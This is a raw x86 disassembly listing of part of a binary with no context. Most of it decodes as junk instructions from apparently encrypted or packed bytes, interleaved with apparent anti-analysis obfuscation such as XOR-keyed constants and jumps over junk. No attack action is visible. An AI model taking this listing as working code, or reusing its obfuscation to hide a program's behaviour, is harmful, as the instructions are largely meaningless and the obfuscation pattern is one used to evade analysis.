  41509b:	ds mov bh,0x6c
  41509e:	pop    ecx
  41509f:	xchg   edx,eax
  4150a0:	mov    ah,0xf4
  4150a2:	xchg   esi,esp
  4150a4:	shr    ebx,cl
  4150a6:	lock xchg DWORD PTR [esi],eax
  4150a9:	imul   ecx,DWORD PTR [ecx],0x98d18281
  4150af:	pop    ss
  4150b0:	cld    
  4150b1:	retf   0x800c
  4150b4:	ret    0xb089
  4150b7:	push   ds
  4150b8:	dec    esp
  4150b9:	ins    BYTE PTR es:[edi],dx
  4150ba:	and    ecx,DWORD PTR [ecx]
  4150bc:	mov    ecx,0x7491c6af
  4150c1:	shl    BYTE PTR [ebx+0x755de2b3],cl
  4150c7:	inc    edx
  4150c8:	sbb    edi,DWORD PTR [ebx-0x47deb035]
  4150ce:	iret   
  4150cf:	mov    bh,0x80
  4150d1:	addr16 push esi
  4150d3:	cmp    eax,0xef5a70af
  4150d8:	addr16 aam 0x25
  4150db:	sti    
  4150dc:	bswap  ecx
  4150de:	fs enter 0x5b6,0xc6
  4150e3:	daa    
  4150e4:	(bad)  
  4150e6:	push   0xec3ff0fb
  4150eb:	sbb    esi,DWORD PTR [edi-0x42]
  4150ee:	mov    bl,0xd0
  4150f0:	test   ah,dh
  4150f2:	mov    al,0x26
  4150f4:	xor    ecx,DWORD PTR [edi+0x4e7b1f81]
  4150fa:	fimul  WORD PTR [esi]
  4150fc:	jg     0x415129
  4150fe:	popa   
  4150ff:	fcom   QWORD PTR [edx+eax*2+0x30]
  415103:	mov    ebx,0x729642
  415108:	clc    
  415109:	mov    ebx,0x12101bbe
  41510e:	cmp    esi,DWORD PTR [ebx+0x8a8c5]
  415114:	shl    al,1
  415116:	imul   ebp,DWORD PTR [ebx],0xddc5308a
  41511c:	or     ebx,edi
  41511e:	xor    al,0x66
  415120:	in     al,dx
  415121:	mov    cl,0x33
  415123:	lahf   
  415124:	ins    BYTE PTR es:[edi],dx
  415125:	retf   0x9631
  415128:	fsub   QWORD PTR [edi-0x38]
  41512b:	ror    DWORD PTR [ecx-0x6442a63],0xbb
  415132:	imul   esp,DWORD PTR [edi+0x374a8341],0xf9798047
  41513c:	shl    DWORD PTR [eax+0x3d],cl
  41513f:	push   ebx
  415140:	mov    al,ds:0x3713dbbe
  415145:	jl     0x415133
  415147:	xchg   BYTE PTR [ebx+esi*4],al
  41514a:	lahf   
  41514b:	ficomp DWORD PTR [esi+edx*1+0x17]
  41514f:	and    esi,ecx
  415151:	mov    ebx,eax
  415153:	xchg   ebp,eax
  415154:	pop    ebx
  415155:	or     ebp,DWORD PTR [esi]
  415157:	repnz or BYTE PTR [edi],0x11
  41515b:	lods   al,BYTE PTR ds:[esi]
  41515c:	inc    ecx
  41515d:	loopne 0x4151d9
  41515f:	xchg   BYTE PTR [edi+0x4d],al
  415162:	dec    edx
  415163:	mov    cl,0xbb
  415165:	or     bh,BYTE PTR [esp+edi*2+0x77]
  415169:	pop    esp
  41516a:	fsub   QWORD PTR [edx+0x2a]
  41516d:	or     al,0x43
  41516f:	xor    bh,0x68
  415172:	pushf  
  415173:	int3   
  415174:	xor    DWORD PTR [ecx+0x5f41abb9],esi
  41517a:	dec    esp
  41517b:	dec    esp
  41517c:	push   ds
  41517d:	adc    al,0x76
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fnstenv [eax-0x12dbb27d]
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	mov    cl,0xee
  4151b2:	or     eax,0xa90664df
  4151b7:	(bad)  
  4151b8:	sub    ebx,DWORD PTR [eax]
  4151ba:	jmp    0x4151d8
  4151bc:	stos   DWORD PTR es:[edi],eax
  4151bd:	jecxz  0x415231
  4151bf:	adc    al,0x36
  4151c1:	cwde   
  4151c2:	mov    cl,0x77
  4151c4:	jmp    0x7f6c:0x3db1816f
  4151cb:	cmp    DWORD PTR [ebp-0x2832567],eax
  4151d1:	mov    esp,0x3986ed1c
  4151d6:	and    edi,DWORD PTR [ebx+esi*8+0x2ba6e7a2]
  4151dd:	std    
  4151de:	or     BYTE PTR [esi+edx*1+0x3d9bd183],cl
  4151e5:	cmp    ah,dl
  4151e7:	add    al,0xa
  4151e9:	dec    esi
  4151ea:	push   es
  4151eb:	mov    ebp,0x45fc1faf
  4151f0:	jecxz  0x415248
  4151f2:	push   edx
  4151f3:	leave  
  4151f4:	stos   BYTE PTR es:[edi],al
  4151f5:	sbb    BYTE PTR [esp+ecx*2],bl
  4151f8:	adc    dh,0x42
  4151fb:	sub    BYTE PTR [edx+ecx*2],bl
  4151fe:	sbb    al,0x62
  415200:	mov    eax,ds:0x976d06e7
  415205:	push   eax
  415206:	xchg   esp,eax
  415207:	xor    ecx,edi
  415209:	add    edi,ebp
  41520b:	mov    ch,0x32
  41520d:	scas   eax,DWORD PTR es:[edi]
  41520e:	mov    dh,0x47
  415210:	ds mov cl,0x2c
  415213:	mov    ah,0xf7
  415215:	dec    ebx
  415216:	xor    al,0x33
  415218:	xor    DWORD PTR [ecx-0x31774956],ebp
  41521e:	pop    ebp
  41521f:	std    
  415220:	fs xor al,0x39
  415223:	add    BYTE PTR [esi+eax*1+0x6d],bh
  415227:	(bad)  
  415228:	xchg   esi,eax
  415229:	dec    esp
  41522a:	fwait
  41522b:	in     eax,0x7e
  41522d:	bound  edx,QWORD PTR [edi+edi*1-0x67]
  415231:	xchg   esi,eax
  415232:	push   cs
  415233:	push   ds
  415234:	xchg   edi,eax
  415235:	xchg   ebp,eax
  415236:	jne    0x4152ae
  415238:	adc    eax,0x5b151565
  41523d:	jmp    0x4151d7
  41523f:	xchg   BYTE PTR [ebp-0x732ce03a],ch
  415245:	mov    esi,0xaf630c55
  41524a:	inc    ecx
  41524b:	pop    edi
  41524c:	jae    0x4152a6
  41524e:	push   ebx
  41524f:	push   ds
  415250:	jge    0x4152a5
  415252:	dec    esi
  415253:	or     al,0xca
  415255:	cmp    al,0x20
  415257:	inc    ebp
  415258:	ficom  DWORD PTR [edx]
  41525a:	xor    al,0x95
  41525c:	fcmovnb st,st(4)
  41525e:	cmp    eax,0xb207c001
  415263:	out    dx,eax
  415264:	popf   
  415265:	int    0xa7
  415267:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  415269:	xor    BYTE PTR [ebx-0x5a],al
  41526c:	jne    0x4152b7
  41526e:	imul   esi,esi,0x49
  415271:	adc    esi,DWORD PTR [ebx]
  415273:	in     eax,0x6
  415275:	cwde   
  415276:	test   eax,0x5e12c3ca
  41527b:	xlat   BYTE PTR ds:[ebx]
  41527c:	inc    eax
  41527d:	popf   
  41527e:	or     ch,al
  415280:	sub    BYTE PTR [ebp+0x21],dh
  415283:	inc    ebx
  415284:	jmp    0x415242
  415286:	push   esp
  415287:	dec    edi
  415288:	jmp    0x8cda51e
  41528d:	mov    al,0x3c
  41528f:	in     al,dx
  415290:	inc    ecx
  415291:	inc    esp
  415292:	outs   dx,BYTE PTR ds:[esi]
  415293:	or     bl,BYTE PTR [edx-0x5082ef99]
  415299:	add    DWORD PTR [ebp+edi*4+0xa],ebp
  41529d:	es pop esi
  41529f:	xchg   esp,eax
  4152a0:	scas   eax,DWORD PTR es:[edi]
  4152a1:	lea    edx,[ecx]
  4152a3:	or     eax,0x5f1758c6
  4152a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152a9:	cdq    
  4152aa:	push   eax
  4152ab:	jl     0x41526c
  4152ad:	daa    
  4152ae:	mov    dl,0x3b
  4152b0:	retf   0xfd18
  4152b3:	pop    ds
  4152b4:	mov    edi,0xd440f769
  4152b9:	outs   dx,BYTE PTR ds:[esi]
  4152ba:	xchg   ebp,eax
  4152bb:	or     BYTE PTR [ecx+0x771add58],ah
  4152c1:	sbb    DWORD PTR [ecx+0x32],ebx
  4152c4:	pop    eax
  4152c5:	das    
  4152c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152c7:	outs   dx,DWORD PTR ds:[esi]
  4152c8:	xor    edx,DWORD PTR [edi-0x3a]
  4152cb:	je     0x41526e
  4152cd:	ss pop ebp
  4152cf:	mov    esi,0x49c3581f
  4152d4:	adc    edi,DWORD PTR [edx+0x96621f]
  4152da:	repz bound ebx,QWORD PTR [eax-0x77]
  4152de:	rcr    DWORD PTR [edi+0x53239f17],cl
  4152e4:	push   cs
  4152e5:	aas    
  4152e6:	ds mov esp,0x9e3169ee
  4152ec:	sbb    al,0xd
  4152ee:	push   edi
  4152ef:	loop   0x4152f1
  4152f1:	jnp    0x415291
  4152f3:	retf   0x3965
  4152f6:	push   ds
  4152f7:	jae    0x415310
  4152f9:	mov    eax,0xc674320
  4152fe:	fistp  WORD PTR [esi+0x3ab05f0f]
  415304:	lahf   
  415305:	cmp    cl,BYTE PTR [ebp-0x6bb4a9e5]
  41530b:	xchg   esp,eax
  41530c:	push   ss
  41530d:	push   eax
  41530e:	inc    edi
  41530f:	sbb    BYTE PTR [ebp-0x27],bh
  415312:	cmp    edx,eax
  415314:	test   eax,0x59fb1d3c
  415319:	jmp    0x664e:0xc0da3a2
  415320:	xchg   edx,eax
  415321:	loop   0x41536e
  415323:	xor    al,0xa
  415325:	sbb    DWORD PTR [edi-0x2],esp
  415328:	stos   DWORD PTR es:[edi],eax
  415329:	adc    eax,0xd03d3548
  41532e:	mov    edx,0x36a2f3a3
  415333:	or     DWORD PTR [edx],esi
  415335:	mov    bl,0x27
  415337:	pavgb  mm5,QWORD PTR [ebx+ebp*8]
  41533b:	test   DWORD PTR [edi],esp
  41533d:	mov    edi,?
  41533f:	sub    al,0x33
  415341:	rcr    DWORD PTR [esi+edi*4-0x31],cl
  415345:	xchg   ecx,eax
  415346:	pop    ebp
  415347:	outs   dx,DWORD PTR ds:[esi]
  415348:	push   edx
  415349:	(bad)  
  41534b:	outs   dx,BYTE PTR ds:[esi]
  41534c:	call   0x9f5f:0xa0119d10
  415353:	adc    DWORD PTR [esi],esp
  415355:	mov    es,WORD PTR [esi+0x27ea9d41]
  41535b:	arpl   WORD PTR [ebp-0x7d],di
  41535e:	loopne 0x415391
  415360:	bswap  edx
  415362:	pop    edx
  415363:	shr    DWORD PTR [edx+ecx*8-0x76],cl
  415367:	push   eax
  415368:	(bad)  
  415369:	bndldx bnd3,[ecx+0x6c]
  41536d:	xchg   DWORD PTR [eax],eax
  41536f:	or     bp,sp
  415372:	sbb    edi,DWORD PTR [esi+0x2983ba9a]
  415378:	add    eax,0xba2016b9
  41537d:	jae    0x415356
  41537f:	cmp    ebx,edi
  415381:	fcomi  st,st(6)
  415383:	mov    dl,0x97
  415385:	out    0xb5,eax
  415387:	popa   
  415388:	stos   DWORD PTR es:[edi],eax
  415389:	pop    ds
  41538a:	test   DWORD PTR [edi-0x6532f97e],edi
  415390:	sar    DWORD PTR [edx-0x67ef3b],cl
  415396:	in     eax,dx
  415397:	push   esi
  415398:	add    edx,edx
  41539a:	fiadd  DWORD PTR [esi-0x6a22ed22]
  4153a0:	mov    esp,0x376c6bcc
  4153a5:	jns    0x41536d
  4153a7:	xchg   BYTE PTR [edx-0x752bc0a8],dh
  4153ad:	in     eax,0xf
  4153af:	push   ebp
  4153b0:	inc    edx
  4153b1:	add    eax,0xb56f4bce
  4153b6:	out    0xeb,eax
  4153b8:	sub    ebx,0x1c
  4153bb:	or     DWORD PTR [esi-0xa3f308d],esi
  4153c1:	push   ecx
  4153c2:	sub    dh,BYTE PTR [edx]
  4153c4:	imul   esi,DWORD PTR [esp+edx*1],0xfffffff0
  4153c8:	idiv   DWORD PTR [edx+eiz*4-0x16]
  4153cc:	xchg   edx,eax
  4153cd:	or     al,0x4
  4153cf:	retf   0xf3f7
  4153d2:	fnstsw WORD PTR [ebx-0x79]
  4153d5:	fst    QWORD PTR [ebp+0x71de3ac4]
  4153db:	lahf   
  4153dc:	cmp    DWORD PTR [edi-0x77],eax
  4153df:	test   BYTE PTR [ebx+0x69],0xdf
  4153e3:	and    eax,0x8d260b9e
  4153e8:	test   DWORD PTR [edi+eiz*8+0x685f1b10],edi
  4153ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153f0:	jne    0x415425
  4153f2:	mov    ebx,0x3eacef00
  4153f7:	or     al,0x9a
  4153f9:	xchg   edx,eax
  4153fa:	sub    DWORD PTR [edx+ebx*8-0x44840698],0x5af43c31
  415405:	repnz (bad) 
  415407:	pop    edi
  415408:	test   BYTE PTR [ebp+0x59],0xcd
  41540c:	mov    esp,0x3a1b44c2
  415411:	jb     0x4153af
  415413:	in     al,dx
  415414:	mov    ecx,0x4817d7e4
  415419:	mov    al,ds:0xacc45aae
  41541e:	pop    edx
  41541f:	sbb    bl,BYTE PTR [ebp-0x65]
  415422:	stos   BYTE PTR es:[edi],al
  415423:	call   0x592fcf32
  415428:	mov    al,ds:0x7c6ac13
  41542d:	pop    ebp
  41542e:	inc    edx
  41542f:	mov    ds:0x34bcc6dd,al
  415434:	mov    eax,0xe52e62b6
  415439:	mov    edx,0x17a58d5
  41543e:	push   edx
  41543f:	je     0x41544d
  415441:	clc    
  415442:	push   ss
  415443:	mov    gs,WORD PTR [edi]
  415445:	fistp  DWORD PTR [ebp-0x5e]
  415448:	xor    BYTE PTR [ebx-0x5b],dh
  41544b:	lods   eax,DWORD PTR ds:[esi]
  41544c:	lods   eax,DWORD PTR ds:[esi]
  41544d:	dec    esp
  41544e:	loopne 0x415418
  415450:	into   
  415451:	mov    BYTE PTR ds:0x8da3ad94,dl
  415457:	inc    esp
  415458:	dec    esi
  415459:	mov    ds:0x6edc0b0e,eax
  41545e:	leave  
  41545f:	inc    edi
  415460:	mov    esi,esp
  415462:	and    DWORD PTR [eax+0x10c5e40a],ecx
  415468:	jmp    0xdc5e:0xfa1b4bc4
  41546f:	adc    eax,0x10ac038
  415474:	lea    edi,[eax]
  415476:	test   BYTE PTR [ebx],0xc2
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0xd0
  4154c8:	iret   
  4154c9:	sbb    eax,0x7f02364e
  4154ce:	jo     0x415489
  4154d0:	jle    0x415542
  4154d2:	jo     0x41554b
  4154d4:	mov    ch,0x2f
  4154d6:	cdq    
  4154d7:	or     eax,0xe72a8bc9
  4154dc:	adc    ebx,edx
  4154de:	out    0xec,eax
  4154e0:	hlt    
  4154e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154e2:	and    al,0x4f
  4154e4:	clc    
  4154e5:	lods   al,BYTE PTR ds:[esi]
  4154e6:	imul   esp,DWORD PTR [ebp-0x76eda126],0xffffffd0
  4154ed:	ficom  WORD PTR [ecx-0x7308e411]
  4154f3:	imul   eax,ebx,0x93195c2d
  4154f9:	(bad)  
  4154fa:	lahf   
  4154fb:	adc    eax,0x7b01746c
  415500:	push   ebx
  415501:	stc    
  415502:	jns    0x4154ac
  415504:	out    0xa5,eax
  415506:	mov    ds:0x4fb5edd8,al
  41550b:	sub    dl,bh
  41550d:	loope  0x415566
  41550f:	cwde   
  415510:	mov    ds:0xb1e5e67d,al
  415515:	mov    dl,0x7a
  415517:	cmp    al,0x20
  415519:	jnp    0x41554e
  41551b:	rcr    DWORD PTR [ebp+0x2120c99e],1
  415521:	push   es
  415522:	mov    ebx,0x2b251eed
  415527:	jle    0x415573
  415529:	imul   BYTE PTR [ecx]
  41552b:	pop    esp
  41552c:	or     DWORD PTR [edx+0x9],ecx
  41552f:	test   eax,0x64077a1b
  415534:	sub    al,0xaa
  415536:	enter  0x9ad9,0xac
  41553a:	pop    es
  41553b:	mov    WORD PTR [esi+0x72],ss
  41553e:	js     0x415591
  415540:	cmp    ebp,eax
  415542:	stos   BYTE PTR es:[edi],al
  415543:	xor    DWORD PTR [ebx+0x66619f61],esp
  415549:	and    eax,0xdfb8ad62
  41554e:	inc    esp
  41554f:	xchg   esi,eax
  415550:	lods   al,BYTE PTR ds:[esi]
  415551:	sbb    BYTE PTR [eax],0x2f
  415554:	add    al,0xe8
  415556:	cmp    BYTE PTR ds:0x15221e5d,0x49
  41555d:	ficom  DWORD PTR [ecx-0x41e97e98]
  415563:	(bad)  
  415565:	dec    ecx
  415566:	cmp    al,0x54
  415568:	xlat   BYTE PTR ds:[ebx]
  415569:	add    eax,0x8e00bfd0
  41556e:	out    0xce,eax
  415570:	push   esp
  415571:	pop    ds
  415572:	mov    ch,0xb
  415574:	xchg   edi,eax
  415575:	icebp  
  415576:	push   cs
  415577:	cmp    al,0xa5
  415579:	push   0xffffffcb
  41557b:	sub    DWORD PTR ds:0x2c2b56d4,edi
  415581:	je     0x41554e
  415583:	mov    ah,0x88
  415585:	pop    eax
  415586:	(bad)  
  415587:	push   edx
  415588:	inc    edx
  415589:	fsub   QWORD PTR [ebx+ebx*8]
  41558c:	and    al,0xa6
  41558e:	adc    BYTE PTR [edx],al
  415590:	cmc    
  415591:	xor    al,0x16
  415593:	ss add al,0xa6
  415596:	(bad)  
  415597:	jp     0x415544
  415599:	inc    esi
  41559a:	clc    
  41559b:	mov    DWORD PTR [ebp-0x1037ebf6],esi
  4155a1:	pop    esi
  4155a2:	rcl    bh,cl
  4155a4:	lods   eax,DWORD PTR ds:[esi]
  4155a5:	dec    esp
  4155a6:	cli    
  4155a7:	pusha  
  4155a8:	fwait
  4155a9:	shl    BYTE PTR [edi],0x41
  4155ac:	inc    edi
  4155ad:	mov    ebx,0x922d23af
  4155b2:	repnz scas al,BYTE PTR es:[edi]
  4155b4:	sub    edx,DWORD PTR [edi]
  4155b6:	int    0xe0
  4155b8:	jne    0x4155f7
  4155ba:	or     eax,DWORD PTR [edx]
  4155bc:	out    dx,al
  4155bd:	pusha  
  4155be:	lahf   
  4155bf:	inc    ebp
  4155c0:	ins    BYTE PTR es:[edi],dx
  4155c1:	adc    BYTE PTR [ecx+0x7824c1ef],dl
  4155c7:	adc    DWORD PTR [edi-0x1e71b455],ecx
  4155cd:	jno    0x4155ed
  4155cf:	ins    DWORD PTR es:[edi],dx
  4155d0:	sub    BYTE PTR [ebx+0x6b337dce],bh
  4155d6:	inc    edi
  4155d7:	ss sbb eax,0x609f42e6
  4155dd:	or     BYTE PTR [eax-0xb],ah
  4155e0:	ja     0x41561b
  4155e2:	and    al,BYTE PTR [edi+0x163ebaad]
  4155e8:	out    0xf9,eax
  4155ea:	fistp  QWORD PTR [ebx-0x35c56292]
  4155f0:	lods   eax,DWORD PTR ds:[esi]
  4155f1:	inc    edi
  4155f2:	retf   0x67cb
  4155f5:	xchg   BYTE PTR [edi-0x67],bh
  4155f8:	push   esp
  4155f9:	in     al,0xc
  4155fb:	pop    ss
  4155fc:	das    
  4155fd:	dec    edx
  4155fe:	sub    eax,0x23a44263
  415603:	push   esp
  415604:	popa   
  415605:	outs   dx,DWORD PTR ds:[esi]
  415606:	sahf   
  415607:	(bad)  
  415608:	fsub   QWORD PTR [ebx+0x548a59d9]
  41560e:	pop    ebp
  41560f:	jmp    0x1ca0:0xb5b4a08e
  415616:	loop   0x4155e8
  415618:	(bad)  
  415619:	call   0x89c5:0xda2299bd
  415620:	xor    ah,BYTE PTR [edi+0x66]
  415623:	add    ecx,ebx
  415625:	dec    edi
  415626:	adc    BYTE PTR [ebx],0x64
  415629:	cmp    BYTE PTR [edx+0x75],bl
  41562c:	sub    DWORD PTR [ecx-0x179cff23],0x3f
  415633:	pop    edi
  415634:	data16 shl BYTE PTR [edx+ebx*2+0x75],0x33
  41563a:	xchg   ah,bl
  41563c:	lods   eax,DWORD PTR ds:[esi]
  41563d:	sbb    ah,al
  41563f:	xchg   DWORD PTR [ebp+0x25],edi
  415642:	aaa    
  415643:	outs   dx,DWORD PTR ds:[esi]
  415644:	lds    ebp,FWORD PTR [ebp+edx*1+0x11]
  415648:	fidivr DWORD PTR [eax+0x7e9129d5]
  41564e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41564f:	pop    esi
  415650:	cmp    DWORD PTR [edi-0x6765b128],ebx
  415656:	xchg   edx,eax
  415657:	jge    0x4156c7
  415659:	pop    ecx
  41565a:	jmp    0x4ec9:0x47556014
  415661:	out    0x98,al
  415663:	or     eax,DWORD PTR [edi-0x567583cc]
  415669:	loopne 0x415698
  41566b:	cwde   
  41566c:	(bad)
  415670:	jmp    0x415658
  415672:	das    
  415673:	mov    ebp,0x2df5c6ae
  415678:	ret    0x30df
  41567b:	pop    esp
  41567c:	pusha  
  41567d:	inc    ebp
  41567e:	(bad)  
  41567f:	xor    BYTE PTR [esi],bl
  415681:	sbb    edi,edx
  415683:	jp     0x4156ca
  415685:	dec    esi
  415686:	std    
  415687:	inc    esi
  415688:	jecxz  0x41563a
  41568a:	ss ja  0x4156f7
  41568d:	mov    edi,DWORD PTR [edi+ecx*8]
  415690:	stc    
  415691:	sub    eax,0x6f9779c7
  415696:	jge    0x415700
  415698:	data16 push dx
  41569b:	dec    edi
  41569c:	ss mov ebx,0xebc38acf
  4156a2:	sbb    DWORD PTR [ebp-0x41],esp
  4156a5:	imul   ebx,ebp,0xe696367b
  4156ab:	and    ch,ch
  4156ad:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4156af:	pop    ebx
  4156b0:	or     al,0xf6
  4156b2:	ins    DWORD PTR es:[edi],dx
  4156b3:	cdq    
  4156b4:	adc    DWORD PTR [ebp-0x2f],edi
  4156b7:	dec    edi
  4156b8:	scas   eax,DWORD PTR es:[edi]
  4156b9:	jle    0x4156e3
  4156bb:	(bad)  
  4156bc:	jne    0x41572b
  4156be:	sub    eax,0x402a80bc
  4156c3:	test   al,dh
  4156c5:	or     al,0x31
  4156c7:	popa   
  4156c8:	and    edi,edx
  4156ca:	(bad)  
  4156cb:	xlat   BYTE PTR ds:[ebx]
  4156cc:	in     al,0x1b
  4156ce:	(bad)  
  4156d0:	bound  esp,QWORD PTR [ebx+edx*4]
  4156d3:	mov    dl,0x49
  4156d5:	and    al,0x38
  4156d7:	mov    edx,0xcad6ae4a
  4156dc:	add    BYTE PTR [ebx-0x43],0x18
  4156e0:	pop    es
  4156e1:	stc    
  4156e2:	(bad)  
  4156e3:	sub    al,0xad
  4156e5:	call   0xcaf6:0xdf1f0288
  4156ec:	and    al,BYTE PTR [ebp-0x46d9737b]
  4156f2:	(bad)  
  4156f3:	fld    QWORD PTR [ebp-0x3c6959a1]
  4156f9:	cmp    DWORD PTR [eax+edi*2-0x5c471aad],esi
  415700:	inc    edi
  415701:	cmp    DWORD PTR [edi],esp
  415703:	jmp    0x37a34e13
  415708:	fs dec esi
  41570a:	add    al,0x68
  41570c:	xlat   BYTE PTR ds:[ebx]
  41570d:	loop   0x4156ad
  41570f:	scas   eax,DWORD PTR es:[edi]
  415710:	sbb    BYTE PTR [ecx-0x61],bh
  415713:	data16 add al,0x49
  415716:	push   esi
  415717:	fiadd  DWORD PTR [edi+eax*4+0x48492c1e]
  41571e:	and    ecx,DWORD PTR [ebp-0x17]
  415721:	(bad)
  415724:	inc    esp
  415725:	cli    
  415726:	(bad)  
  415727:	sbb    eax,0x47b80cfe
  41572c:	sbb    BYTE PTR [eax+ecx*4+0x5049b2c9],ch
  415733:	out    dx,eax
  415734:	pop    edx
  415735:	jno    0x415711
  415737:	in     al,dx
  415738:	aas    
  415739:	leave  
  41573a:	(bad)  
  41573b:	pop    ebx
  41573c:	xchg   esi,eax
  41573d:	dec    edx
  41573e:	push   eax
  41573f:	repz jge 0x4156d5
  415742:	mov    BYTE PTR [ecx],bh
  415744:	sub    al,BYTE PTR [eax+0x248adc74]
  41574a:	shl    ecx,cl
  41574c:	fsubr  QWORD PTR [ebx-0x7a]
  41574f:	stos   BYTE PTR es:[edi],al
  415750:	adc    ah,BYTE PTR [edi-0x6c6254a4]
  415756:	into   
  415757:	fdivr  QWORD PTR [ebx+0x69]
  41575a:	sub    ebp,ecx
  41575c:	pop    ebx
  41575d:	pop    esi
  41575e:	jb     0x415773
  415760:	loope  0x4157b2
  415762:	xor    DWORD PTR [esi+0x78246c80],0xb0fb0081
  41576c:	mov    bl,BYTE PTR [ecx+0x28dfd018]
  415772:	jp     0x4157d9
  415774:	jecxz  0x415703
  415776:	xor    esp,ebp
  415778:	add    ebx,DWORD PTR [edx-0x9f73feb]
  41577e:	fild   QWORD PTR [esi+0x8a30ab1]
  415784:	cmp    eax,DWORD PTR [esi+0x58]
  415787:	mov    ds:0x360e960a,eax
  41578c:	pop    ebp
  41578d:	fsub   st(1),st
  41578f:	pop    edi
  415790:	jno    0x415807
  415792:	jo     0x41579f
  415794:	push   0x64
  415796:	jbe    0x415787
  415798:	sub    eax,0x729cbe95
  41579d:	xor    al,BYTE PTR [eax]
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [ecx+0x11],cl
  4157b9:	or     edx,DWORD PTR [esi+0x7f]
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x4157e3
  4157c4:	lahf   
  4157c5:	push   esp
  4157c6:	fs xchg esi,eax
  4157c8:	es cwde 
  4157ca:	jns    0x415750
  4157cc:	jnp    0x415787
  4157ce:	push   edx
  4157cf:	leave  
  4157d0:	pop    ecx
  4157d1:	or     eax,0x239e7ade
  4157d6:	pop    esp
  4157d7:	push   esp
  4157d8:	jmp    0x4157d2
  4157da:	dec    DWORD PTR [edi]
  4157dc:	test   DWORD PTR [ecx+0x487d81d1],0xce8c2e43
  4157e6:	mov    edx,0x3d544ad9
  4157eb:	cld    
  4157ec:	idiv   DWORD PTR [edx+0x3c]
  4157ef:	hlt    
  4157f0:	cmp    cl,bh
  4157f2:	aaa    
  4157f3:	aaa    
  4157f4:	popf   
  4157f5:	popf   
  4157f6:	mov    ch,0x82
  4157f8:	hlt    
  4157f9:	fnstcw WORD PTR [ebx]
  4157fb:	push   edi
  4157fc:	and    al,0x3c
  4157fe:	and    BYTE PTR [eax],ch
  415800:	jb     0x4157d7
  415802:	mov    bh,0xe9
  415804:	dec    ebp
  415805:	jno    0x415836
  415807:	jg     0x41581e
  415809:	rol    DWORD PTR [edi+0x53857fd2],0x66
  415810:	add    edx,esp
  415812:	inc    esi
  415813:	sbb    ch,BYTE PTR [ebx]
  415815:	xchg   esp,eax
  415816:	sti    
  415817:	and    BYTE PTR [ebp-0x52],0xb3
  41581b:	rcr    BYTE PTR [eax-0x2c],cl
  41581e:	xlat   BYTE PTR ds:[ebx]
  41581f:	call   0x4003:0xdf2f4c9a
  415826:	jne    0x4158a7
  415828:	ins    BYTE PTR es:[edi],dx
  415829:	mov    edx,0x762a2d73
  41582e:	ins    DWORD PTR es:[edi],dx
  41582f:	sub    ebp,DWORD PTR [eax-0x18]
  415832:	rol    esi,0x7
  415835:	push   esp
  415836:	inc    esi
  415837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415838:	aaa    
  415839:	jecxz  0x4157e5
  41583b:	jo     0x4157dd
  41583d:	fbstp  TBYTE PTR [ebx+0x2f]
  415840:	ds jne 0x415817
  415843:	xchg   ecx,eax
  415844:	mov    dl,BYTE PTR ds:0x7727df6d
  41584a:	aad    0xe2
  41584c:	sbb    eax,0x1c2e4e4
  415851:	add    al,0x78
  415853:	jecxz  0x415800
  415855:	in     al,0x77
  415857:	xor    eax,0x9e4568b0
  41585c:	cmp    ecx,DWORD PTR [edi+0x3a]
  41585f:	mov    bh,0xc0
  415861:	mov    bh,0x90
  415863:	retf   
  415864:	xor    ecx,esp
  415866:	dec    esp
  415867:	sub    al,BYTE PTR [edi]
  415869:	dec    ebp
  41586a:	adc    ecx,ecx
  41586c:	sub    BYTE PTR [esi+ecx*1],0x7e
  415870:	outs   dx,BYTE PTR ds:[esi]
  415871:	loope  0x4158aa
  415873:	adc    bl,BYTE PTR [edx+edx*1]
  415876:	push   ss
  415877:	lahf   
  415878:	adc    esp,DWORD PTR [edi+edi*4+0x1a76a5aa]
  41587f:	and    dl,BYTE PTR [edi+0x54fda1b4]
  415885:	xlat   BYTE PTR ds:[ebx]
  415886:	shr    BYTE PTR [ebx],1
  415888:	les    ecx,FWORD PTR [esi-0x46fff14a]
